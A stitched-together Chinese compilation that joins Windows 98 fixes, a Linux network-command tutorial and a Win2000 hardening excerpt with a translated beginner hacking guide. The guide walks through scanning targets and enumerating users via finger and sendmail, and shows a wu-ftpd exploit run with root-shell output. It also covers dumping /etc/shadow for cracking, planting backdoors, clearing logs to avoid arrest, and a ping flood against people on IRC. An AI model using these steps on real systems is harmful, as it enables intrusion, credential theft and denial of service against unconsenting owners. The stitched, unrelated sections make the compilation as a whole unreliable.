在试图使用GBK输入法输入大字符集的汉字时，发现系统居然没有提供GBK输入法，使用系统的“输入法添加”功能也不能添加。 
故障分析： 
这并非中文Windows 98没有向用户提供GBK输入法，而是Windows 98将Windows 95中分别用于输入普通文字的普通输入法和专用的GBK输入法合二为一了。我们可利用这些合并后的输入法直接输入GBK大字符集中的任何字符。 
解决方法：


调出能输入GBK汉字的输入法(如“全拼输入法”)，用鼠标右键单击“输入法状态条”，选择弹出菜单中的“设置”选项，调出“输入法设置”对话框，从“检索字符集”框中选择“GBK”选项(如图2)即可。 
整理磁盘碎片导致死循环 
故障现象： 
使用Windows 9x的磁盘碎片整理程序整理磁盘碎片，在进行到10%时程序陷入死循环。 
故障分析： 
磁盘碎片整理的1%～10%阶段是检查驱动程序是否有错和读取驱动程序信息，10%之后才进行真正的磁盘碎片整理。系统总是进行到10%之后陷入死循环，多半是因为内存驻留程序，从而形成死循环。 
解决方法： 
在整理磁盘碎片之前先关闭内存驻留程序，然后再进行整理。如果磁盘碎片整理仍然不能进行，则应使用Scandisk对磁盘进行全面检查，以排除磁盘故障的可能性。另外，用户若较长时间没有整理过磁盘碎片，那么从10%开始到11%的过程需要很长的时间。 
系统提示“VXD或386文件无效”错误 
故障现象： 
系统在启动时显示“*.VXD或386文件无效”的错误提示，单击任意键后，系统能启动并运行正常。 
故障分析： 
该故障的产生主要是因为，用户在系统中安装了不兼容的驱动程序或网络组件；采用正确的程序卸载方法将某些自启动程序卸载后，因为某种原因造成注册表损坏，于是用备份的注册表文件进行恢复，也会造成系统启动时找不到某些.VXD或.386文件。 
解决方法： 
若错误信息所涉及的文件扩展名为.386或未显示文件的扩展名，我们先打开Windows文件夹中的System.ini文件，在该文件的[386Enh]节中删除错误提示所涉及的命令行。如果提示信息仍然存在，就需启动注册表编辑器，利用该编辑器提供的搜索功能找到该命令所在的主键，将该主键删除即可。若错误信息所涉及的文件扩展名为.vxd，则进入注册表编辑器，将对应的VXD驱动程序的主键删除。 
关闭系统时计算机无响应 
故障现象： 
执行Windows 9x的“关闭计算机”命令之后，长时间处在显示“正在关机”的画面状态中。 
故障分析： 
引发此故障的原因较多，如关闭系统功能所对应的声音文件损坏、快速关机功能存在冲突、电源管理功能存在冲突等。 
解决方法：


首先通过“控制面板”中的“声音”选项取消“关闭系统”所对应的声音文件，重启计算机后若还没有解决问题则启动系统配置程序，单击“常规”标签中的“高级”按钮，打开“高级疑难解答设置”对话框，复选“禁用快速关机”选项取消系统的快速关机功能。若仍没有解决，则打开“系统属性”设置框，在“设备管理器”选项卡中展开“系统设备”分支，双击“高级电源管理支持”项，打开“高级电源管理支持属性”设置框，复选“常规”标签中的“在此硬件配置文件中禁用”选项(如图3)，关闭高级电源管理功能。重启计算机，问题一般都会迎刃而解。 
硬盘盘符发生错乱 
故障现象： 
为计算机添加第二块硬盘后，第二块硬盘的盘符居然变成了D:，而原来的D盘则变成了E:，这使得许多应用程序因为盘符错乱而无法运行。 
故障分析： 
按照DOS对硬盘的管理方式，当同时有两个以上硬盘时，各个磁盘分区的盘符就会变，第一个硬盘的主分区还是C，而D则是第二块硬盘的主分区盘符，第一块硬盘的各个逻辑分区将依次变为E、F……第二块硬盘的各个逻辑分区则为G、H…… 
解决方法： 
在Windows 9x中，只需在BIOS中将第二块硬盘设置为NONE(空)即可。这样，Windows 9x的即插即用功能会探测到新增的硬盘，并自动为该硬盘上的各个磁盘分区设置盘符，此时所设置的盘符都排列在第一个硬盘的所有磁盘分区之后。不过此方法新增的磁盘分区在DOS下将处于隐藏状态。若要在DOS下访问第二块硬盘，在对第二块硬盘进行分区时，不对其设置主分区，而将整个硬盘全部划为扩展分区，然后再设置相应的逻辑分区。这种方式可保证计算机能在任何条件下访问所有的磁盘分区。
常用网路侦错指令
常用网路侦错指令
　 
一. ifconfig 指令. 
　 
ifconfig 指令用来设定网路介面, 并可查询目前网路介面的设定情形. 
语法: 
1. ifconfig [介面]　 
介面可以不写, 若不写, 则显示目前使用中的介面. 
介面可以填入: eth0, eth1　等. 
若是下　 
2. ifconfig -a 
则会列出所有的网路介面情形. 
[root@ols3-note /root]# ifconfig -a 
eth0　　　Link encap:Ethernet　HWaddr 00:80:C8:8F:B8:F4 
　　　　　inet addr:192.168.54.51　Bcast:192.168.54.63　Mask:255.255.255.240 
　　　　　UP BROADCAST RUNNING MULTICAST　MTU:1500　Metric:1 
　　　　　RX packets:234 errors:0 dropped:0 overruns:0 frame:0 
　　　　　TX packets:65 errors:0 dropped:0 overruns:0 carrier:0 
　　　　　collisions:0 txqueuelen:100 
　　　　　Interrupt:3 Base address:0x320 
lo　　　　Link encap:Local Loopback 
　　　　　inet addr:127.0.0.1　Mask:255.0.0.0 
　　　　　UP LOOPBACK RUNNING　MTU:3924　Metric:1 
　　　　　RX packets:0 errors:0 dropped:0 overruns:0 frame:0 
　　　　　TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 
　　　　　collisions:0 txqueuelen:0 
其中 : 
eth0 表示第一张网路卡 
lo 表示 loopback , 即没有连接到真实网路时的网路介面, 可用来测试网路的应用软体, 并且提供区域性的 TCP/IP 服务. 
HWaddr 是网路卡的硬体位址 
inet addr 是网路卡的 IP, 
Bcast 是广播(broadcast) 的位址 
Mask 是网路遮罩. 
MTU 是 Maximum Trasmission Unit 最大传输单元(位元组), 即此介面一次所能传输的最大封包. 
Metric 是权值之意, 路由权值, 或所需的花费, 目前尚未使用, 将来会 implement. 
RX 是接收情形. 
TX 是传送情形. 
collisions 是网路讯号碰撞的意思 
txqueuelen 是传输缓区长度大小意思 
Interrupt 是 IRQ 中断位址 
Base address 是 I/O 位址 
3. ifconfig 介面 [aftype] 选项 | 位址 
aftype 是位址家族之意, 预设值是 inet (TCP/IP) 
其它还有 ddp(AppleTalk) ipx(Novell)　 
详细情形, 请自行 man ifconfig 
不建议各位用 ifconfig 手动修改, 请用 linuxconf 较佳. 
不过, 在查验为何网路不通时, 经常会遇到的问题是 netmask 设错了, 这时, 手动设 netmask 倒是十分方便的方法. 
假设 netmask 应为 255.255.255.128, 但你的网路卡却是 255.255.255.0 
那麽下: 
ifconfig eth0 netmask 255.255.255.128 
即可改正过来. 
ifconfig eth0 down 可将网路卡关闭, 此时下 ifconfig 将只看到 lo. 
[root@ols3-note /root]# ifconfig 
lo　　　　Link encap:Local Loopback 
　　　　　inet addr:127.0.0.1　Mask:255.0.0.0 
　　　　　UP LOOPBACK RUNNING　MTU:3924　Metric:1 
　　　　　RX packets:0 errors:0 dropped:0 overruns:0 frame:0 
　　　　　TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 
　　　　　collisions:0 txqueuelen:0 
ifconfig eth0 up 可将网路卡打开, 下 ifcofnig 又可看到 eth0 及 lo 了. 
[root@ols3-note /root]# ifconfig 
eth0　　　Link encap:Ethernet　HWaddr 00:80:C8:8F:B8:F4 
　　　　　inet addr:192.168.54.51　Bcast:192.168.54.63　Mask:255.255.255.240 
　　　　　UP BROADCAST RUNNING MULTICAST　MTU:1500　Metric:1 
　　　　　RX packets:234 errors:0 dropped:0 overruns:0 frame:0 
　　　　　TX packets:65 errors:0 dropped:0 overruns:0 carrier:0 
　　　　　collisions:0 txqueuelen:100 
　　　　　Interrupt:3 Base address:0x320 
lo　　　　Link encap:Local Loopback 
　　　　　inet addr:127.0.0.1　Mask:255.0.0.0 
　　　　　UP LOOPBACK RUNNING　MTU:3924　Metric:1 
　　　　　RX packets:0 errors:0 dropped:0 overruns:0 frame:0 
　　　　　TX packets:0 errors:0 dropped:0 overruns:0 carrier:0 
　　　　　collisions:0 txqueuelen:0 
二. ping 指令.　 
ping 指令用来侦测某一主机是否存活, 或者网路是否可以正常连线. 
指令:　 
ping IP 
ping HOSTNAME 
例: ping 192.168.54.49 
[root@ols3-note /root]# ping 192.168.54.49 
PING 192.168.54.49 (192.168.54.49): 56 data bytes 
64 bytes from 192.168.54.49: icmp_seq=0 ttl=128 time=0.8 ms 
64 bytes from 192.168.54.49: icmp_seq=1 ttl=128 time=0.7 ms 
64 bytes from 192.168.54.49: icmp_seq=2 ttl=128 time=0.7 ms 
64 bytes from 192.168.54.49: icmp_seq=3 ttl=128 time=0.7 ms 
64 bytes from 192.168.54.49: icmp_seq=4 ttl=128 time=0.7 ms 
^C 
--- 192.168.54.49 ping statistics --- 
5 packets transmitted, 5 packets received, 0% packet loss 
round-trip min/avg/max = 0.7/0.7/0.8 ms 
上面表示: 传递5个封包, 5个封包都接收到了, 没有任可 loss 的情形. 
icmp 是 ICMP 协定的意思, seq 是序列之意. 
TTL 是 Time To Live , 每当经过一个 gateway, TTL 就会减 1, 若某一站的 gateway 收到时, TTL 为 0, 就会送回一个 TimeOut 的讯号回来. 
为何只传了5个封包? 因为我中间有按了 ^C, 将 ping 中断了. 
若你不想麻烦, 按 ^C, 可以在 ping 执行时加 -c 选项, 用以设定 ping 的次数. 
如下: 
ping -c 10 192.168.54.49 
则只 ping 10 次. 
三. netstat 指令.　 
netstat 指令用来查看网路介面的使用状况及 routing table. 
指令: 
netstat -i　 
显示网路卡的运作情形: 
[root@ols3-note /root]# netstat -i 
Kernel Interface table 
Iface　 MTU Met　　RX-OK RX-ERR RX-DRP RX-OVR　　TX-OK TX-ERR TX-DRP TX-OVR Flg 
eth0　 1500　 0　　　682　　　0　　　0　　　0　　　179　　　0　　　0　　　0 BRU 
lo　　 3924　 0　　　　0　　　0　　　0　　　0　　　　0　　　0　　　0　　　0 LRU 
Iface 是指网路介面 
MTU 前面有介绍过! 
Met 是 Metric 路由权值 
RX 是接收情形 
TX 是传送情形 
OK 表示正常 
ERR 表示错误 
DRP 表示被丢掉的封包数 
OVR 表示 TimeOut 或其它因素 
Flg 是旗标的意思, 其定义如下: 
A 接收 multicast　 
B 接收 broadcast　 
D 除错功能已启动　 
L Loopback　 
M 处於不选择状态　 
N 没有处理封包尾端部份　 
O ARP 已关闭　 
P 此介面是做为 point to point 用　 
R 此介面正在运作　 
U 此介面已经启动　 
记住上面标有颜色的这四个即可. 
指令: 
netstat -r (等同於 route -e) 
查看主机的 routing table. 
[root@ols3-note /root]# netstat -r 
Kernel IP routing table 
Destination　　 Gateway　　　　 Genmask　　　　 Flags　 MSS Window　irtt Iface 
192.168.54.48　 *　　　　　　　 255.255.255.240 U　　　　0 0　　　　　0 eth0 
127.0.0.0　　　 *　　　　　　　 255.0.0.0　　　 U　　　　0 0　　　　　0 lo 
default　　　　 192.168.54.62　0.0.0.0　　　　 UG　　　　0 0　　　　　0 eth0 
Gateway 若是打 *, 表示 ip 位址由 Iface 所指定的介面传出去. 
default 表示 default gateway 之意. 
Flags : 
U 是启动之意 
G 是 Gateway 
MSS : TCP Maximum Segment Size 之意 
Window : TCP window size for connections over this route. 
irtt : initial round trip time for TCP connections over this route to ? milliseconds (1-12000). This is typically only used on AX.25 network. 
四. route 指令.　 
route 指令用来显示及设定 IP routing table. 
语法如下: 
route [-CFvnee] 
　　　 route　[-v]　[-A　family] add [-net|-host] target [netmask 
　　　　　　　Nm] [gw Gw] [metric N] [mss M] [window W] [irtt　I] 
　　　　　　　[reject] [mod] [dyn] [reinstate] [[dev] If] 
　　　 route　[-v]　[-A　family]　del [-net|-host] target [gw Gw] 
　　　　　　　[netmask Nm] [metric N] [[dev] If] 
　　　 route　[-V] [--version] [-h] [--help] 
route -e 或 route -n 
显示 routing table 
route add -net 目标IP位址 Gateway位址 
如: route add -net 168.95.111.0 gw 192.100.78.254 
增加一笔 route 路由. 
route del 168.95.111.0 则删除路由. 
不建议各位使用. 
五. traceroute 指令.　 
traceroute 指令用来显示路由封包到达目的位址的情形. 
指令: 
traceroute 目标位址 
例: 
traceroute 163.26.200.1 
[root@ols3-note /root]# traceroute 163.26.200.1 
traceroute to 163.26.200.1 (163.26.200.1), 30 hops max, 40 byte packets 
1　192.168.54.62 (192.168.54.62)　5.503 ms　6.196 ms　4.753 ms 
2　h199.s42.ts.hinet.net (168.95.42.199)　4724.234 ms　30.553 ms　30.663 ms 
3　h158.s42.ts.hinet.net (168.95.42.158)　32.137 ms　30.777 ms　30.629 ms 
4　h241.s42.ts.hinet.net (168.95.42.241)　31.557 ms　30.594 ms　30.491 ms 
5　TaiPei-R05.BR.hinet.net (168.95.202.251)　35.569 ms　35.992 ms　35.472 ms 
6　TaiPei-R06.BR.hinet.net (168.95.253.6)　40.306 ms　38.313 ms　42.221 ms 
7　210.65.161.205 (210.65.161.205)　37.510 ms　37.096 ms　35.993 ms 
8　HiNet-TANet.hinet.net (134.208.252.254)　37.386 ms　45.459 ms　37.692 ms 
9　TANet-NCKU.EDU.TW (203.72.38.116)　61.242 ms　47.260 ms　39.298 ms 
10　203.72.191.162 (203.72.191.162)　57.857 ms　49.093 ms　68.809 ms 
11　163.26.200.1 (163.26.200.1)　52.608 ms　100.533 ms　71.910 ms 
上表显示, 到达目的地, 共需经过 10 个 gateway. 
hop 是: 跳跃的意思, 在此指的是封包在二个节点之间的传输路程
黑客必须知道的基础知识
Unix黑客初学者指导
翻译：black4 （ nbjt@sina.com ） 
   首先说一下写这篇文章的目的，近来越来越多的人问我诸如“我如何能够黑了hotmail”或者aol等等一些其他的愚蠢的问题。这篇文章将确实的向你解释关于“hack”的一些知识。如果你是个初学者，你应当从头到尾通读这篇文章，或者如果你已经进阶了，那就别再往下看了，你应该全都了解的。我或许将往这篇文章中添加一些内容或者让他变得更易于理解。我写这篇文章的最根本的原因是，让别人不再来问我或者其他人如何去做*愚蠢*的事，是的，问如何去黑（how to hack）是*愚蠢*的，它让你看起来愚蠢并且学不到任何东西，当然除非你完全不能自学的话。 
　 
   起初当我想弄乱别人的电脑时，我只是一个中学的小孩子。我问别人有关病毒和木马的事，并且使用它们，那时我是一个lamer（瘸子，不完整的）。我在学校里问别人并且最终发现一个对hacking感兴趣的人。他向我展示一些技巧，我付给他钱。（snowblue：现在有SQL，无用等一些高手义务的帮助你们，而你们却不好好的珍惜）他使用UNIX很多年了，他叫我去找一个shell。我不知道那是什么意思。他说那是对UNIX系统的访问许可权。我仍然有点迷惑，最终我得到了一个shell。我读所有我能够找到的，把所有的时间都花在电脑上，我开始对社会和现实世界失去兴趣。那时候我每天在电脑上花的时间超过12个小时。我读任何找到的资料，我读的第一篇文章是"mostly harmless hacking"（几乎没有破坏性的入侵），我对它很感兴趣。起初我只会用一些图形模式的工具来做一些像改变关机萤幕的简单的事。做有关hacking的网站，尽管我并不知道hacking究竟是什么。我收集windows下的木马和病毒等一些工具，尽管那并不是hacking，但那时候我喜欢它们。随后我开始用邮件炸弹，flooder，DoS。当我对他们有了了解后，（我意识到那并不是hacking）我回去继续寻找shell。当时我所能找到的免费的shell都是非常简单的。我听说了有关linux的一些事。我问我学校的“黑客朋友”，他说不要用linux，用真正的UNIX。他搬到了PA,从那以后我再也没有他的音讯。我试图找到他并感谢它所教给我的，但没有成功。我得到了一个linux。安装是文本模式的，但它运行很迅速，它比windows要可乱说话多了，从不死机。但我的56k modem不能工作，我跑到了IRC问有关linux的问题。我发现了我的modem是一种叫winmodem的，win-moden是由软体控制的，他们通常比硬体modem慢，并且不能再linux下工作。（snowblue：现在大多数的modem在linux下都有驱动，你可以自己寻找）我在命令行下模式工作，看自己能够干些什么。最终我花了100美元买了一个linux相容的modem。我让他工作，这太棒了。从那以后我就使用它，并且仍然可以在那上面学到更多的东西。我的父母说我“对电脑着魔了”，我试图解释我并没有。我从没有对它感到厌烦，我一直能够学到新的东西。那段时间里，我失去了一些朋友，退出了大学足球队。所有的一切仅仅是为了这该死的机器。希望某人可以发现这篇文章很有用。 
目录 
1． 普通的知识 
2． 需要的东西 
3． 简单的入侵 
4． 如何进入 
5． 列举 
6． 常见的失误 
7． 缓冲溢出 
8． 防火墙 
9． 进入之后干些什么 
10． 如何才能不被抓住 
11． 清除纪录 
12． 用途 
13． 我对破坏者的看法 
否认声明： 
阅读这篇文章说明你同意隶属于r00t-access的任何人都不对你通过看这篇文章所造成的任何后果负责 
1． 读这篇文章的最好方法是一次把它读完，然后再读一遍。好吧，现在让我们开始。我假设你已经有了一些基本的知识，知道telnet是什么，一些基本的tcp/ip的知识等等。如果有一些你并不理解，不要犹豫，加入irc.dal.net上的#r00t-access，那是我常去的地方。 
需要的东西： 
2． 我列出了一些在这篇教程中需要的东西。你可以在anti-secure.com和packetstorm.securify.com找到它们。用引擎找一下就可以了。 
1. - superscan (for windows) 
2. - nmap (for unix) 
3. - full shell access (the very best is if you have linux or bsd or solaris or another unix OS) 
4. - compiler on the shell 
5. - wingates (you can use them as telnet proxys) 
容易的目标： 
3． 这里我讲一下如何找到一些容易的目标 
1． 到altavista.com用日语或其他语言搜索“游戏”，理由是这些站点的安全性较低 
2． 扫描一个有很多服务的cable或者dsl子网，你可以用nmap，埠的状态应当是open而不是close或者filtered，nmap的扫描报告会告诉你的。我将不会告诉你如何使用namp，原因是man page已经有作够的资讯了。 
3． 确保nmap已经被安装了。使用下面我给出的命令 
（注意：$是一个普通的用户，而#则是超级用户。作为例子，我用了24.112.*.*，吧它替换成你想要扫瞄的ip） 
$ nmap -p 21,23 24.112.*.* 
进入： 
4． 为了能够进入，你应当收集尽可能多的有关目标主机的资讯。由于这是你的第一次入侵，所以确保它有一个笨笨的管理员。然后你可以使用exploit。我将在后面详细解释 
列举： 
5． Ok 我们找到了目标。现在让我们得到更多的资讯。首先来telnet它的79埠。如果它是打开的，你就可以得到以登陆用户的信息。仅仅是telnet然后按下回车。 
让我们假定埠是打开的并且允许我们查看线上用户。看下面的例子： 
$ telnet target.domain 79 
Trying IPaddress... 
Connected to target.domain. 
Escape character is ^]. 
Login Name Tty Idle Login Time Office Office Phone 
gt grahm crackhead /1 Sep 1 12:01 
ok 如果你得到了一个login，把它记下来，然后找更多的login。或许你需要暴力穷句。你可以在www.packetstorm.securify.com 找到一个windows下的穷具工具。使用大量的单词来穷举那个帐号。如果你得到的消息是"no one is logged on" 或许你需要一个windows下的haktek。同样，你可以在www.packetstorm.securify.com 找到它。Haketk能够让你监视finger进程并且纪录登陆的人。这是很有用的。另一种方法，你可以用sendmail。如果他们有很多的用户，你可以尝试telnet并且找几个有效的用户名，还可以找几个程式通过暴力法来完成。看下面，我给出了通过sendmail来得到有效的用户名的例子－ 
$ telnet target.domain 25 
Trying IPaddress... 
Connected to target.domain. 
Escape character is ^]. 
220 target.domain ESMTP Sendmail 8.9.3/8.9.3; Fri, 1 Sep 2000 12:11:00 -0400 
expn wally 
250 Wally Kolcun 
vrfy wally 
250 Wally Kolcun 
expn Billy 
550 BIlly... User Unknown 
就像你所看到的，我telnet到他们的smtp，敲入expn，然后系统告诉我这是不是一个有效的用户，最后我给出了一个用户不存在的例子，当我敲入expn Billy，系统告诉我用户不存在，然后我知道这不是一个合法的用户。这同样可以帮助你得到他们的email，然后你就可以尝试一下社会工程学。 
另一个搜集用户名的方法可以是利用usenet, altavista,你可以搜索一下新闻组，或许可以得到一些有用的资讯。 
另一些可以利用的进程是 systat netstat等等。 
telnet还可以帮助你判断出对方的作业系统，当你想exploit时这是非常重要的。当telnet时，有些会给出系统资讯，如下所示： 
Trying IPaddress... 
Connected to target.domain. 
Escape character is ^]. 
Red Hat Linux release 6.1 (Cartman) 
Kernal 2.2.12-20 on an i586 
login: 
你可以看到，系统是redhat 6.1 
有些时候你可以使用社会工程学，拿Kevin Mitnick举个例子。它使用社会工程学进入了Novell，一个很大的系统。它所作的只是像一个在那里工作的人那样和别人交谈。他知道当时那里的某人正在度假，但是他知道某人的名字。他打电话到了Novell的办公室找那个人，然后秘书告诉他那个人正在度假，然后他说它需要和那个人联系，于是它便从秘书那里得到了那个人的资讯。 
常见的失误： 
6． 人们会时不时的犯一些错误。这可以帮助你进入。某些人并不是很好的管理员。一个十分普遍的失误是许可权设置上的错误。有些系统对所有人都开放了write许可权。这是一个很大的问题。让我们举个例子。某人把cron.daily的write许可权开放给所有人。你就可以上传一个后门程式并通过cron进程来执行，从而得到系统的访问权。 
现在让我来告诉你最可怕的事。假如某个用户在系统上使用IRC，并且如果它把dcc档传送设置为自动接收，接受目录为他的主目录。你就可以传给他一个.bash_profile，档写的好的话，可以让他做一些事。例如添加一个用户，或者把密码邮寄给某人。很显然这是进入系统的最简单的方法。 
缓冲溢出/exploiting： 
7． 我不打算对缓冲溢出讲得太深，我只想借是那是什么然后进入下一节。 
缓冲溢出－在进程上有一个叫缓冲限制的东西。缓冲限制限制了进入的位元组数。某些情况下，你可以通过特殊的代码让缓冲区溢出来得到一个root用户或者普通用户。有一个例子是wu-ftpd 2.6.0 (1)的缓冲溢出。下面我将告诉你： 
$ gcc wuftpd-god.c -o wuftpd-god 
$ ./wuftpd-god -h 
Usage: ./wuftpd-god -t [-l user/pass] [-s systype] [-o offset] [-g] [-h] [-x] 
[-m magic_str] [-r ret_addr] [-P padding] [-p pass_addr] [-M dir] 
target : host with any wuftpd 
user : anonymous user 
dir : if not anonymous user, you need to have writable directory 
magic_str : magic string (see exploit description) 
-g : enables magic string digging 
-x : enables test mode 
pass_addr : pointer to setproctitle argument 
ret_addr : this is pointer to shellcode 
systypes: 
0 - RedHat 6.2 (?) with wuftpd 2.6.0(1) from rpm 
1 - RedHat 6.2 (Zoot) with wuftpd 2.6.0(1) from rpm 
2 - SuSe 6.3 with wuftpd 2.6.0(1) from rpm 
3 - SuSe 6.4 with wuftpd 2.6.0(1) from rpm 
4 - RedHat 6.2 (Zoot) with wuftpd 2.6.0(1) from rpm (test) 
5 - FreeBSD 3.4-STABLE with wuftpd 2.6.0(1) from ports 
* 6 - FreeBSD 3.4-STABLE with wuftpd 2.6.0(1) from packages 
7 - FreeBSD 3.4-RELEASE with wuftpd 2.6.0(1) from ports 
8 - FreeBSD 4.0-RELEASE with wuftpd 2.6.0(1) from packages 

$ ./wuftpd-god -s0 -t target.domain 
Target: target.domain (ftp/): RedHat 6.2 (?) with wuftpd 2.6.0(1) from rpm 
Return Address: 0x08075844, AddrRetAddr: 0xbfffb028, Shellcode: 152 
loggin into system.. 
[32mUSER ftp 
[0m331 Guest login ok, send your complete e-mail address as password. 
[32mPASS 
[0m230-Next time please use your e-mail address as your password 
230- for example: joe@cc456375-b.abdn1.md.home.com 
230 Guest login ok, access restrictions apply. 
STEP 2 : Skipping, magic number already exists: [87,01:03,02:01,01:02,04] 
STEP 3 : Checking if we can reach our return address by format string 
Linux melmac 2.2.14-5.0 #1 Tue Mar 7 21:07:39 EST 2000 i686 unknown 
uid=0(root) gid=0(root) egid=50(ftp) groups=50(ftp) 
# 
如果你想要root的话，exploit是一种方法。查出系统的作业系统，然后到hack.co.za 或者packetstorm 查找那个系统的exploit，你应当得到一些perl scripts/c scripts/shell scripts。执行它们，你就会成为root 
当然，如果系统打了exploit的补丁，你或许想知道root的口令是什么。可以敲下面的命令： 
（如果没有经过shadow，口令被存放于/etc/passwd） 
# cat /etc/shadow > /root/passwd 
root:34jk3h4jh3.,;8363:0:0:root:/root:/bin/bash 
bin:x:1:1:bin:/bin: 
daemon:x:2:2:daemon:/sbin: 
adm:x:3:4:adm:/var/adm: 
lp:x:4:7:lp:/var/spool/lpd: 
sync:x:5:0:sync:/sbin:/bin/sync 
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 
halt:x:7:0:halt:/sbin:/sbin/halt 
mail:x:8:12:mail:/var/spool/mail: 
news:x:9:13:news:/var/spool/news: 
uucp:x:10:14:uucp:/var/spool/uucp: 
operator:x:11:0:operator:/root: 
games:x:12:100:games:/usr/games: 
sympa:x:89:89:Sympa Mailing list manager:/home/sympa:/bin/bash 
gopher:x:13:30:gopher:/usr/lib/gopher-data: 
ftp:x:14:50:FTP User:/home/ftp: 
nobody:x:99:99:Nobody:/: 
xfs:x:100:103:X Font Server:/etc/X11/fs:/bin/false 
fax:x:10:14:Fax Master:/home/fax/:/bin/bash 
postfix:x:101:233:postfix:/var/spool/postfix: 
gdm:x:42:235::/home/gdm:/bin/bash 
grim:9hu.u8:501:501:grim:/home/grim:/bin/bash 
banal:x:102:236:BANAL Administrator:/home/banal:/bin/bash 
bleeb:36.34/363;86:502:506::/home/bleeb:/bin/bash 
上面就是/etc/passwd的内容，但是你需要破解他们，可以用john the ripper，可以在packetstorm或其他地方找到它。我就用它，他很快。（snowbue：支援国产，你可以用小榕的 乱刀 可以在在www.netxeyes.com 下载）有时破解一个帐号要用几年的时间，所以我并不提倡这种做法。 
防火墙： 
8． 如果你了解你所作的，防火墙并不能阻止你。我很喜欢用nmap，这个工具非常好。在www.insecure.org 可以找到最新的版本。我喜欢它的OS（作业系统）检测，即使目标只运行了很少的服务，它的检测也很准确。它通过分析目标的tcp指纹并于自身携带的资料库作比较来得到结果。下面给出一个使用nmap来查出防火墙规则的例子。敲入nmap －sA 。浙江检测防火墙的规则。我不想太过深入而是这篇文章变得使人厌烦。如果你像知道更多有关nmap的，只需敲入man nmap就可以了。 
进入以后做什么： 
9． 进入以后做什么取决于你想如何使用这个系统。如果你想有一个匿名的root shell，那么就设置一个后门。你可以在www.packetstorm.securify.com 找到后门（木马）。我认为你完全有能力自己独立设置一个后门，但是如果你需要帮助的话，加入$r00t-access，或许我可以帮助你。但是我*不会*帮助你进入一个系统，不过我或许可以帮助你加固你自己的系统。 
如何才能不被抓住： 
10． 最主要的事是。别干*蠢*事。如果你想保住那个shell，不要破坏那个系统，不要删除他们的档，不过或许你需要修改他们的纪录。这就是我想说的。 
清除纪录： 
11． 如果你还向待在这儿而不进监狱的话，清除日志是最重要的工作。在login/hostname中清除纪录，linux里是/var/log，还有你目录下的.bash_profile文件。作这事的最简单的方法是到blackcode.com 或packetstorm找一个工具。 
用途： 
12． 我一向都拥有超过一个root shell。我在那上面运行nmap和saint来隐藏我自己的主机。或许我会在那上面设置一个web proxy/bnc。Saint是一个很好的工具。它可以告诉你系统有些什么漏洞。你可以在远端很容易的使用它。有时当我看不惯某人的时候，我就flood他们，就像这样： 
# ping -f -c 50 -s 4500 IPaddress 
......................................................... 
........................................................... 
.........E...........E...EE........E..................E....... 
..............E.......E.EEE...................E.E...... 
Host unreatchable. 
有人认为这是lame的，但是我通过这样来让某人在IRC里闭嘴。 
破坏者： 
13． 在这篇文章中我没有谈到hacking，实际上我我所涉及的只是cracking，我并不破坏系统，可能永远都不会。并不是我没有这个能力而是因为这是不对的。再加上如果你被抓住了你或许会因为你的破坏而坐几年牢。我不喜欢人们把hacking和cracking混为一谈 
ok 写完了。如果你有问题的话，可以联系我，但请不要问诸如如何去黑的问题。不久我将建一个telnet的BBS。 
　
如何配置解决WIN2000服务器安全问题 
 目前，WIN2000 SERVER是比较流行的服务器操作系统之一，但是要想安全的配置微软的这个操作系统，却不是一件容易的事。本文试图对win2000 SERVER的安全配置进行初步的探讨。 
一、 定制自己的WIN2000 SERVER； 
1． 版本的选择：WIN2000有各种语言的版本，对于我们来说，可以选择英文版或简体中文版，我强烈建议：在语言不成为障碍的情况下，请一定使用英文版。要知道，微软的产品是以Bug & Patch而著称的，中文版的Bug远远多于英文版，而补丁一般还会迟至少半个月（也就是说一般微软公布了漏洞后你的机子还会有半个月处于无保护状况） 
2． 组件的定制：win2000在默认情况下会安装一些常用的组件，但是正是这个默认安装是极度危险的（米特尼科说过，他可以进入任何一台默认安装的服务器，我虽然不敢这么说，不过如果你的主机是WIN2000 SERVER的默认安装，我可以告诉你，你死定了）你应该确切的知道你需要哪些服务，而且仅仅安装你确实需要的服务，根据安全原则，最少的服务+最小的权限=最大的安全。典型的WEB服务器需要的最小组件选择是：只安装IIS的Com Files，IIS Snap-In，WWW Server组件。如果你确实需要安装其他组件，请慎重，特别是：Indexing Service, FrontPage 2000 Server Extensions, Internet Service Manager (HTML)这几个危险服务。 
3． 管理应用程序的选择 
选择一个好的远程管理软件是非常重要的事，这不仅仅是安全方面的要求，也是应用方面的需要。Win2000的Terminal Service是基于RDP（远程桌面协议）的远程控制软件，他的速度快，操作方便，比较适合用来进行常规操作。但是，Terminal Service也有其不足之处，由于它使用的是虚拟桌面，再加上微软编程的不严谨，当你使用Terminal Service进行安装软件或重起服务器等与真实桌面交互的操作时，往往会出现哭笑不得的现象，例如：使用Terminal Service重起微软的认证服务器（Compaq, IBM等）可能会直接关机。所以，为了安全起见，我建议你再配备一个远程控制软件作为辅助，和Terminal Service互补，象PcAnyWhere就是一个不错的选择。 
二、 正确安装WIN2000 SERVER 
1．分区和逻辑盘的分配，有一些朋友为了省事，将硬盘仅仅分为一个逻辑盘，所有的软件都装在C驱上，这是很不好的，建议最少建立两个分区，一个系统分区，一个应用程序分区，这是因为，微软的IIS经常会有泄漏源码/溢出的漏洞，如果把系统和IIS放在同一个驱动器会导致系统文件的泄漏甚至入侵者远程获取ADMIN。推荐的安全配置是建立三个逻辑驱动器，第一个大于2G，用来装系统和重要的日志文件，第二个放IIS，第三个放FTP，这样无论IIS或FTP出了安全漏洞都不会直接影响到系统目录和系统文件。要知道，IIS和FTP是对外服务的，比较容易出问题。而把IIS和FTP分开主要是为了防止入侵者上传程序并从IIS中运行。（这个可能会导致程序开发人员和编辑的苦恼，管他呢，反正你是管理员J） 
2．安装顺序的选择：不要觉得：顺序有什么重要？只要安装好了，怎么装都可以的。错！win2000在安装中有几个顺序是一定要注意的： 
首先，何时接入网络：Win2000在安装时有一个漏洞，在你输入Administrator密码后，系统就建立了ADMIN$的共享，但是并没有用你刚刚输入的密码来保护它，这种情况一直持续到你再次启动后，在此期间，任何人都可以通过ADMIN$进入你的机器；同时，只要安装一完成，各种服务就会自动运行，而这时的服务器是满身漏洞，非常容易进入的，因此，在完全安装并配置好win2000 SERVER之前，一定不要把主机接入网络。 
